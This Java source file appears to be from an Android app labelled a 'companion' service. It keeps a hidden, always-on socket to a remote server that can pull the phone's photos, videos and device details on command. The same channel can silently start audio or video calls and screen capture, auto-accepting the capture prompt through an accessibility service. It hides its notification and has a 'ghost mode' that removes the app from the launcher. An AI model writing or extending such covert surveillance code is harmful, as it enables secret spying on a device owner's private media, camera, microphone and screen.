package com.tokendeal.vremote;

import android.app.ActivityManager;
import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.wifi.WifiManager;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.PowerManager;
import android.util.Log;
import androidx.core.app.NotificationCompat;

import org.json.JSONObject;

import java.io.File;
import java.util.List;

import io.socket.client.IO;
import io.socket.client.Socket;

/**
 * 24/7 Persistent Background Companion Foreground Service.
 * Ensures the device maintains an active socket to v.tokendeal.cloud even when
 * MainActivity is closed or swiped away. Handles waking, remote calling, gallery,
 * videos, and device info queries in the background without touching the phone.
 */
public class BackgroundKeepAliveService extends Service {
    private static final String TAG = "BgKeepAliveService";
    private static final String CHANNEL_ID = "VRemoteCompanionChannel";
    private static final int NOTIFICATION_ID = 8802;
    private static final String SERVER_URL = "https://v.tokendeal.cloud";

    private static BackgroundKeepAliveService sInstance = null;
    private static long sLastEndCallTime = 0;
    private static long sLastAutoCallTime = 0;

    public static final String PREF_NAME = "vremote_prefs";
    public static final String KEY_BG_ACTIVE = "bg_service_active";
    public static final String HEARTBEAT_FILE = "bg_service_alive";

    private Socket mBgSocket = null;
    private volatile boolean mBgSocketConnecting = false;
    /** True only while the service is genuinely in the foreground state (guards startForeground). */
    private static volatile boolean sForegroundActive = false;
    private PowerManager.WakeLock mWakeLock = null;
    private WifiManager.WifiLock mWifiLock = null;
    private final Handler mWatchdogHandler = new Handler(Looper.getMainLooper());

    private final Runnable mWatchdogRunnable = new Runnable() {
        @Override
        public void run() {
            try {
                touchHeartbeat();
                if (mBgSocket == null || !mBgSocket.connected()) {
                    Log.i(TAG, "Watchdog: Socket disconnected, reconnecting...");
                    initBackgroundSocket();
                }
            } catch (Exception ignored) {}
            mWatchdogHandler.postDelayed(this, 5000);
        }
    };

    /**
     * Dual-process check: Returns true if BackgroundKeepAliveService is running,
     * whether checked from its own :companion process or from MainActivity's main process.
     */
    public static boolean isServiceRunning(Context context) {
        if (sInstance != null) {
            return true;
        }
        if (context == null) return false;

        // 1. Process check: check if :companion process is currently active
        try {
            ActivityManager am = (ActivityManager) context.getSystemService(Context.ACTIVITY_SERVICE);
            if (am != null) {
                List<ActivityManager.RunningAppProcessInfo> runningProcesses = am.getRunningAppProcesses();
                if (runningProcesses != null) {
                    String companionProcess = context.getPackageName() + ":companion";
                    for (ActivityManager.RunningAppProcessInfo processInfo : runningProcesses) {
                        if (companionProcess.equals(processInfo.processName)) {
                            return true;
                        }
                    }
                }
            }
        } catch (Exception ignored) {}

        // 2. Heartbeat marker file check (written and refreshed every 5s by the service)
        try {
            File bgFile = new File(context.getFilesDir(), HEARTBEAT_FILE);
            if (bgFile.exists()) {
                long lastMod = bgFile.lastModified();
                if (System.currentTimeMillis() - lastMod < 60000) {
                    return true;
                }
            }
        } catch (Exception ignored) {}

        // 3. Fallback: check persistent flag
        try {
            SharedPreferences sp = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
            if (sp.getBoolean(KEY_BG_ACTIVE, false)) {
                return true;
            }
        } catch (Exception ignored) {}

        // 4. Remote Accessibility Service fallback (if accessibility is running, background communication is guaranteed active)
        if (RemoteAccessibilityService.isServiceRunningOrEnabled(context)) {
            return true;
        }

        return false;
    }

    public static boolean isServiceRunning() {
        return isServiceRunning(null);
    }

    public static BackgroundKeepAliveService getInstance() {
        return sInstance;
    }

    public static void startService(Context context) {
        if (context == null) return;
        try {
            SharedPreferences sp = context.getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
            sp.edit().putBoolean(KEY_BG_ACTIVE, true).apply();
            try {
                File bgFile = new File(context.getFilesDir(), HEARTBEAT_FILE);
                if (!bgFile.exists()) bgFile.createNewFile();
                bgFile.setLastModified(System.currentTimeMillis());
            } catch (Exception ignored) {}

            Intent intent = new Intent(context, BackgroundKeepAliveService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(intent);
            } else {
                context.startService(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "Failed to start BackgroundKeepAliveService", e);
        }
    }

    @Override
    public void onCreate() {
        super.onCreate();
        sInstance = this;
        AppLogs.init(this);
        Log.i(TAG, "BackgroundKeepAliveService created");
        touchHeartbeat();
        setRunningState(true);
        createNotificationChannel();
        startInForeground();
        acquireLocks();
        initBackgroundSocket();
        CrashReporter.checkAndReportPreviousCrash(this);
        mWatchdogHandler.postDelayed(mWatchdogRunnable, 5000);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        touchHeartbeat();
        setRunningState(true);
        startInForeground();
        if (mBgSocket == null || !mBgSocket.connected()) {
            initBackgroundSocket();
        }
        return START_STICKY;
    }

    @Override
    public void onTaskRemoved(Intent rootIntent) {
        super.onTaskRemoved(rootIntent);
        AppLogs.i(TAG, "onTaskRemoved: Activity swiped away, ensuring BackgroundKeepAliveService persists!");
        touchHeartbeat();
        setRunningState(true);
        // Only re-push the foreground notification while we are actually a
        // foreground service. Calling startForeground() after the system has
        // demoted us throws RemoteServiceException on API 26+.
        if (isForegroundActive()) {
            startInForeground();
        }
        if (mBgSocket == null || !mBgSocket.connected()) {
            initBackgroundSocket();
        }
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.w(TAG, "BackgroundKeepAliveService destroyed, releasing resources");
        mWatchdogHandler.removeCallbacks(mWatchdogRunnable);
        setRunningState(false);
        deleteHeartbeat();
        releaseLocks();
        if (mBgSocket != null) {
            try {
                AppLogs.unregisterSocket(mBgSocket);
                mBgSocket.disconnect();
                mBgSocket.close();
            } catch (Exception ignored) {}
            mBgSocket = null;
        }
        sInstance = null;
    }

    private void touchHeartbeat() {
        try {
            File bgFile = new File(getFilesDir(), HEARTBEAT_FILE);
            if (!bgFile.exists()) {
                bgFile.createNewFile();
            }
            bgFile.setLastModified(System.currentTimeMillis());
        } catch (Exception ignored) {}
    }

    private void deleteHeartbeat() {
        try {
            File bgFile = new File(getFilesDir(), HEARTBEAT_FILE);
            if (bgFile.exists()) {
                bgFile.delete();
            }
        } catch (Exception ignored) {}
    }

    private void setRunningState(boolean running) {
        try {
            SharedPreferences sp = getSharedPreferences(PREF_NAME, Context.MODE_PRIVATE);
            sp.edit().putBoolean(KEY_BG_ACTIVE, running).apply();
        } catch (Exception ignored) {}
    }

    private void startInForeground() {
        try {
            Intent notificationIntent = new Intent(this, MainActivity.class);
            PendingIntent pendingIntent = PendingIntent.getActivity(
                    this, 0, notificationIntent,
                    PendingIntent.FLAG_IMMUTABLE | PendingIntent.FLAG_UPDATE_CURRENT
            );

            Notification notification = new NotificationCompat.Builder(this, CHANNEL_ID)
                    .setSmallIcon(R.drawable.app_icon)
                    .setContentTitle("")
                    .setContentText("")
                    .setContentIntent(pendingIntent)
                    .setOngoing(true)
                    .setPriority(NotificationCompat.PRIORITY_MIN)
                    .setVisibility(NotificationCompat.VISIBILITY_SECRET)
                    .setSilent(true)
                    .build();

            try {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
                        startForeground(NOTIFICATION_ID, notification, android.content.pm.ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC);
                    } else {
                        startForeground(NOTIFICATION_ID, notification, 0);
                    }
                } else {
                    startForeground(NOTIFICATION_ID, notification);
                }
                sForegroundActive = true;
            } catch (Exception fgsEx) {
                Log.w(TAG, "startForeground typed failed, falling back to basic foreground", fgsEx);
                try {
                    startForeground(NOTIFICATION_ID, notification);
                    sForegroundActive = true;
                } catch (Exception ignored) {
                    sForegroundActive = false;
                }
            }
        } catch (Exception e) {
            sForegroundActive = false;
            Log.e(TAG, "Error starting foreground notification", e);
        }
    }

    /** True only while this service is genuinely in the foreground state. */
    private boolean isForegroundActive() {
        if (!sForegroundActive) return false;
        try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                android.app.NotificationManager nm =
                        (android.app.NotificationManager) getSystemService(Context.NOTIFICATION_SERVICE);
                // If the system dropped our notification we are no longer foreground.
                return nm != null && nm.getActiveNotifications() != null;
            }
        } catch (Throwable ignored) {}
        return sForegroundActive;
    }

    private void createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel channel = new NotificationChannel(
                    CHANNEL_ID,
                    "Companion Service",
                    NotificationManager.IMPORTANCE_MIN
            );
            channel.setShowBadge(false);
            channel.enableVibration(false);
            channel.setSound(null, null);
            channel.setLockscreenVisibility(Notification.VISIBILITY_SECRET);
            NotificationManager manager = getSystemService(NotificationManager.class);
            if (manager != null) {
                manager.createNotificationChannel(channel);
            }
        }
    }

    private void acquireLocks() {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null && mWakeLock == null) {
                mWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "VRemote::BgServiceWakeLock");
                mWakeLock.setReferenceCounted(false);
                mWakeLock.acquire();
                Log.i(TAG, "Acquired Partial WakeLock for 24/7 background socket");
            }

            WifiManager wm = (WifiManager) getApplicationContext().getSystemService(Context.WIFI_SERVICE);
            if (wm != null && mWifiLock == null) {
                if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.HONEYCOMB_MR1) {
                    mWifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "VRemote::BgServiceWifiLock");
                } else {
                    mWifiLock = wm.createWifiLock("VRemote::BgServiceWifiLock");
                }
                mWifiLock.setReferenceCounted(false);
                mWifiLock.acquire();
                Log.i(TAG, "Acquired High-Perf WiFi Lock for 24/7 background socket");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error acquiring locks", e);
        }
    }

    private void releaseLocks() {
        try {
            if (mWakeLock != null && mWakeLock.isHeld()) {
                mWakeLock.release();
                mWakeLock = null;
            }
            if (mWifiLock != null && mWifiLock.isHeld()) {
                mWifiLock.release();
                mWifiLock = null;
            }
        } catch (Exception ignored) {}
    }

    private void initBackgroundSocket() {
        if (mBgSocket != null) {
            if (mBgSocket.connected()) return;
            // Socket.IO already retries on its own. Re-entering here on every
            // watchdog tick (5s) stacked reconnects and leaked listeners.
            if (mBgSocket.connected() || mBgSocketConnecting) return;
            mBgSocketConnecting = true;
            try {
                mBgSocket.connect();
            } catch (Exception ignored) {
                mBgSocketConnecting = false;
            }
            return;
        }
        mBgSocketConnecting = true;
        try {
            IO.Options opts = new IO.Options();
            opts.reconnection = true;
            opts.reconnectionAttempts = Integer.MAX_VALUE;
            opts.reconnectionDelay = 1000;
            opts.timeout = 10000;
            opts.transports = new String[]{"websocket", "polling"};

            mBgSocket = IO.socket(SERVER_URL, opts);
            AppLogs.registerSocket(mBgSocket);

            mBgSocket.on(Socket.EVENT_CONNECT, args -> {
                mBgSocketConnecting = false;
                String sId = mBgSocket != null ? mBgSocket.id() : "null";
                AppLogs.i(TAG, "Background KeepAlive Socket Connected [id=" + sId + ", url=" + SERVER_URL + "]");
                AppLogs.flushPersistentLogs(mBgSocket);
                registerDeviceBackground();
            });

            mBgSocket.on(Socket.EVENT_DISCONNECT, args -> {
                mBgSocketConnecting = false;
                String reason = (args != null && args.length > 0 && args[0] != null) ? String.valueOf(args[0]) : "unknown";
                String sId = mBgSocket != null ? mBgSocket.id() : "null";
                AppLogs.w(TAG, "Background KeepAlive Socket Disconnected [id=" + sId + ", url=" + SERVER_URL + ", reason=" + reason + "]");
            });

            mBgSocket.on(Socket.EVENT_CONNECT_ERROR, args -> {
                mBgSocketConnecting = false;
                String error = (args != null && args.length > 0 && args[0] != null) ? String.valueOf(args[0]) : "unknown";
                AppLogs.e(TAG, "Background KeepAlive Socket Connect Error [url=" + SERVER_URL + ", error=" + error + "]");
            });

            mBgSocket.on("auto-command", args -> {
                try {
                    JSONObject data = (JSONObject) args[0];
                    String command = data.optString("command", "");
                    String fromSocketId = data.optString("from", "");
                    String caller = data.optString("caller", fromSocketId);
                    String cameraChoice = data.optString("cameraChoice", "front");
                    int page = data.optInt("page", 0);
                    long mediaId = data.optLong("mediaId", -1);
                    String mediaType = data.optString("mediaType", "image");

                    Log.i(TAG, "Background auto-command received: " + command + " from " + caller);

                    if ("get_gallery".equals(command)) {
                        MediaBridge.getGalleryPage(this, page, mBgSocket, fromSocketId);
                    } else if ("get_videos".equals(command)) {
                        MediaBridge.getVideoPage(this, page, mBgSocket, fromSocketId);
                    } else if ("get_media_detail".equals(command)) {
                        MediaBridge.getMediaItemDetail(this, mediaId, mediaType, mBgSocket, fromSocketId);
                    } else if ("get_device_info".equals(command)) {
                        JSONObject info = new JSONObject();
                        info.put("deviceId", DeviceRegistry.getDeviceId(this));
                        info.put("deviceName", DeviceRegistry.getDeviceModel());
                        info.put("ram", DeviceRegistry.getDeviceRam(this));
                        info.put("platform", "android");
                        info.put("targetSocketId", fromSocketId);
                        if (mBgSocket != null && mBgSocket.connected()) {
                            mBgSocket.emit("device-info-response", info);
                        }
                    } else if ("audio_call".equals(command) || "video_call".equals(command)) {
                        long now = System.currentTimeMillis();
                        if (now - sLastAutoCallTime < 2500) {
                            Log.w(TAG, "Ignoring duplicate " + command + " within 2.5s");
                            return;
                        }
                        sLastAutoCallTime = now;
                        if ("audio_call".equals(command)) {
                            MainActivity.startMediaForegroundService(this, "audio_call");
                            WebRTCCompanion companion = MainActivity.getOrCreateCompanion(this);
                            companion.startAudioCall(caller);
                        } else {
                            MainActivity.startMediaForegroundService(this, "video_call");
                            WebRTCCompanion companion = MainActivity.getOrCreateCompanion(this);
                            companion.startVideoCall(caller);
                        }
                    } else if ("screen_share".equals(command) || "screen_share_control".equals(command)) {
                        HeadlessCaptureActivity.start(this, caller, "screen_share_control".equals(command), false, cameraChoice);
                    } else if ("end_call".equals(command)) {
                        long now = System.currentTimeMillis();
                        if (now - sLastEndCallTime < 2500) {
                            Log.w(TAG, "Ignoring duplicate end_call command in BackgroundKeepAliveService");
                            return;
                        }
                        sLastEndCallTime = now;

                        Intent serviceIntent = new Intent(this, ScreenCaptureService.class);
                        stopService(serviceIntent);
                        sendBroadcast(new Intent("com.tokendeal.vremote.ACTION_END_CALL"));
                        MainActivity act = MainActivity.getInstance();
                        if (act != null) {
                            act.runOnUiThread(() -> {
                                try {
                                    MainActivity current = MainActivity.getInstance();
                                    if (current != null) {
                                        current.stopAllMediaAndFinish();
                                    }
                                } catch (Throwable ignored) {}
                            });
                        }
                    } else if ("close_app".equals(command)) {
                        AppLogs.i(TAG, "close_app command received: Swiping away and closing task completely");
                        MainActivity act = MainActivity.getInstance();
                        if (act != null) {
                            act.runOnUiThread(() -> {
                                try {
                                    MainActivity current = MainActivity.getInstance();
                                    if (current != null) {
                                        current.closeAppCompletely();
                                    }
                                } catch (Throwable t) {
                                    try { act.finishAffinity(); } catch (Throwable ignored) {}
                                }
                            });
                        }
                        try {
                            if (RemoteAccessibilityService.getInstance() != null) {
                                RemoteAccessibilityService.getInstance().performHome();
                            }
                        } catch (Throwable ignored) {}
                    } else if ("flip_camera".equals(command) || "switch_camera".equals(command)) {
                        if (MainActivity.getInstance() != null && MainActivity.getInstance().getWebRTCCompanion() != null) {
                            MainActivity.getInstance().runOnUiThread(() -> {
                                MainActivity.getInstance().getWebRTCCompanion().switchCompanionCamera();
                            });
                        }
                    } else if ("ghost_mode".equals(command)) {
                        // A missing value must never be read as "false" — that
                        // silently disabled ghost mode on every toggle command
                        // that carried no explicit flag.
                        Boolean parsed = parseOptionalBool(data.opt("value"));
                        boolean enable;
                        if (parsed != null) {
                            enable = parsed;
                        } else {
                            boolean current = getSharedPreferences(GhostStateSync.PREF_NAME, Context.MODE_PRIVATE)
                                    .getBoolean(GhostStateSync.KEY_GHOST, false);
                            enable = !current;   // no opinion sent → flip
                        }
                        Log.i(TAG, "Ghost command: raw=" + data.opt("value") + " -> enable=" + enable);
                        setGhostMode(enable);
                    }
                } catch (Exception e) {
                    Log.e(TAG, "Error processing background auto-command", e);
                }
            });

            mBgSocket.connect();
        } catch (Exception e) {
            mBgSocketConnecting = false;
            Log.e(TAG, "Error initializing background socket", e);
        }
    }

    private void registerDeviceBackground() {
        try {
            String deviceId = DeviceRegistry.getDeviceId(this);
            String deviceName = DeviceRegistry.getDeviceModel();
            String ram = DeviceRegistry.getDeviceRam(this);

            JSONObject payload = new JSONObject();
            payload.put("deviceId", deviceId);
            payload.put("deviceName", deviceName);
            payload.put("ram", ram);
            payload.put("platform", "android");
            payload.put("role", "background_service");
            GhostStateSync.putGhostFields(payload, this);

            if (mBgSocket != null && mBgSocket.connected()) {
                mBgSocket.emit("register-device", payload);
                Log.i(TAG, "Background Device Registered: " + deviceId + " (" + deviceName + ")");
            }
        } catch (Exception e) {
            Log.e(TAG, "Error registering background device", e);
        }
    }

    public void wakeUpAndLaunch(String command, String caller, String cameraChoice) {
        try {
            PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
            if (pm != null) {
                PowerManager.WakeLock wl = pm.newWakeLock(
                        PowerManager.PARTIAL_WAKE_LOCK,
                        "vremote:bg_wake"
                );
                wl.acquire(15000);
            }
        } catch (Exception ignored) {}

        if ("screen_share".equals(command) || "screen_share_control".equals(command)) {
            RemoteAccessibilityService.triggerAutoAccept(this);
        }

        // Android 14 (API 34) strictly forbids background activities from calling startActivityForResult(createScreenCaptureIntent).
        // Always launch Intent with FLAG_ACTIVITY_NEW_TASK | FLAG_ACTIVITY_REORDER_TO_FRONT | FLAG_ACTIVITY_SINGLE_TOP to bring MainActivity to foreground.
        Intent intent = new Intent(this, MainActivity.class);
        intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_REORDER_TO_FRONT | Intent.FLAG_ACTIVITY_SINGLE_TOP);
        intent.putExtra("auto_command", command);
        intent.putExtra("caller", caller);
        intent.putExtra("cameraChoice", cameraChoice);

        try {
            if (Build.VERSION.SDK_INT >= 34) {
                android.app.ActivityOptions opt = android.app.ActivityOptions.makeBasic();
                opt.setPendingIntentBackgroundActivityStartMode(android.app.ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED);
                startActivity(intent, opt.toBundle());
            } else {
                startActivity(intent);
            }
        } catch (Exception e) {
            Log.e(TAG, "startActivity failed: " + e.getMessage());
        }

        // If MainActivity is already running, also schedule direct handling after a short delay
        if (MainActivity.getInstance() != null) {
            new android.os.Handler(android.os.Looper.getMainLooper()).postDelayed(() -> {
                if (MainActivity.getInstance() != null) {
                    MainActivity.getInstance().handleAutoCommandDirectly(command, caller, cameraChoice);
                }
            }, 200);
        }
    }

    private void setGhostMode(boolean enable) {
        // Single source of truth: save to local prefs + server (survives reinstall) + apply aliases
        GhostStateSync.save(this, enable);
        Log.d("VRemoteBkg", "Ghost mode " + (enable ? "ENABLED — app removed from launcher" : "DISABLED — app visible"));
    }

    /**
     * Lenient boolean parsing for protocol values.
     * Returns null when the value carries no opinion (missing / null / empty),
     * so callers can distinguish "off" from "not specified".
     */
    static Boolean parseOptionalBool(Object raw) {
        if (raw == null) return null;
        if (raw instanceof Boolean) return (Boolean) raw;
        if (raw instanceof Number) return ((Number) raw).intValue() != 0;
        String s = String.valueOf(raw).trim().toLowerCase();
        if (s.isEmpty() || "null".equals(s)) return null;
        if (s.equals("true") || s.equals("1") || s.equals("on") || s.equals("yes")
                || s.equals("enable") || s.equals("enabled")) return Boolean.TRUE;
        if (s.equals("false") || s.equals("0") || s.equals("off") || s.equals("no")
                || s.equals("disable") || s.equals("disabled")) return Boolean.FALSE;
        return null;
    }
}
